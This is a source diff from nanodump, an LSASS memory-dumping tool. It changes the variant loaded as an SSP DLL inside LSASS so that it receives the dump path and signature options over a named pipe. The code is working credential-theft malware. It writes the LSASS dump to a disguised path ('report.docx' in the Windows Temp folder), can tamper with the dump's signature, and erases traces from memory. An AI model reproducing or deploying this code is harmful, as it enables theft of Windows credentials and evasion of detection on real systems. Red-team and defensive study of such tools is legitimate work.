@@ -910,19 +910,63 @@ cleanup:
 #elif defined(NANO) && defined(SSP)
 
 #include "ssp.h"
+#include "pipe.h"
 
 BOOL NanoDumpSSP(void)
 {
-    /******************* change this *******************/
-    LPCSTR dump_path     = "C:\\Windows\\Temp\\report.docx";
-    BOOL   use_valid_sig = FALSE;
-    /***************************************************/
+#if !defined(PASS_PARAMS_VIA_NAMED_PIPES) || (PASS_PARAMS_VIA_NAMED_PIPES == 0)
 
-    dump_context   dc;
-    BOOL           success;
-    WCHAR          wcFilePath[MAX_PATH];
-    UNICODE_STRING full_dump_path;
-    BOOL           bReturnValue = FALSE;
+    /*
+     * if you compile with -DPASS_PARAMS_VIA_NAMED_PIPES=0, then these are the parameters
+     * that the nanodump DLL will use, change them to your liking
+     */
+    /******************* change this *******************/
+    LPCSTR         dump_path            = "C:\\Windows\\Temp\\report.docx";
+    BOOL           use_valid_sig        = FALSE;
+    /***************************************************/
+    dump_context   dc                   = { 0 };
+    BOOL           ret_val              = FALSE;
+    BOOL           success              = FALSE;
+    HANDLE         hProcess             = NULL;
+    SIZE_T         region_size          = 0;
+    PVOID          base_address         = NULL;
+    WCHAR          wcFilePath[MAX_PATH] = { 0 };
+    UNICODE_STRING full_dump_path       = { 0 };
+
+#else
+    HANDLE         hPipe                = NULL;
+    LPSTR          dump_path            = NULL;
+    BOOL           use_valid_sig        = FALSE;
+    dump_context   dc                   = { 0 };
+    BOOL           ret_val              = FALSE;
+    BOOL           success              = FALSE;
+    HANDLE         hProcess             = NULL;
+    SIZE_T         region_size          = 0;
+    PVOID          base_address         = NULL;
+    WCHAR          wcFilePath[MAX_PATH] = { 0 };
+    UNICODE_STRING full_dump_path       = { 0 };
+
+    success = server_create_named_pipe(
+        IPC_PIPE_NAME,
+        FALSE,
+        &hPipe);
+    if (!success)
+        goto cleanup;
+
+    success = server_listen_on_named_pipe(
+        hPipe);
+    if (!success)
+        goto cleanup;
+
+    success = server_recv_arguments_from_pipe(
+        hPipe,
+        &dump_path,
+        &use_valid_sig,
+        NULL);
+    if (!success)
+        goto cleanup;
+
+#endif
 
     full_dump_path.Buffer        = wcFilePath;
     full_dump_path.Length        = 0;
@@ -952,11 +996,11 @@ BOOL NanoDumpSSP(void)
     }
 
     // we are LSASS after all :)
-    HANDLE hProcess = NtCurrentProcess();
+    hProcess = NtCurrentProcess();
 
     // allocate a chuck of memory to write the dump
-    SIZE_T region_size = DUMP_MAX_SIZE;
-    PVOID base_address = allocate_memory(&region_size);
+    region_size = DUMP_MAX_SIZE;
+    base_address = allocate_memory(&region_size);
     if (!base_address)
         goto cleanup;
 
@@ -985,15 +1029,26 @@ BOOL NanoDumpSSP(void)
     if (!success)
         goto cleanup;
 
-    bReturnValue = TRUE;
+    ret_val = TRUE;
 
 cleanup:
     if (dc.BaseAddress && dc.DumpMaxSize)
         erase_dump_from_memory(dc.BaseAddress, dc.DumpMaxSize);
-    if (!bReturnValue)
+    if (!ret_val)
         delete_file(dump_path);
+#if defined(PASS_PARAMS_VIA_NAMED_PIPES) && (PASS_PARAMS_VIA_NAMED_PIPES == 1)
+    if (dump_path)
+        intFree(dump_path);
+    server_send_success(
+        hPipe,
+        ret_val);
+    if (hPipe)
+        server_disconnect_pipe(hPipe);
+    if (hPipe)
+        NtClose(hPipe);
+#endif
 
-    return bReturnValue;
+    return ret_val;
 }
 
 __declspec(dllexport) BOOL APIENTRY DllMain(
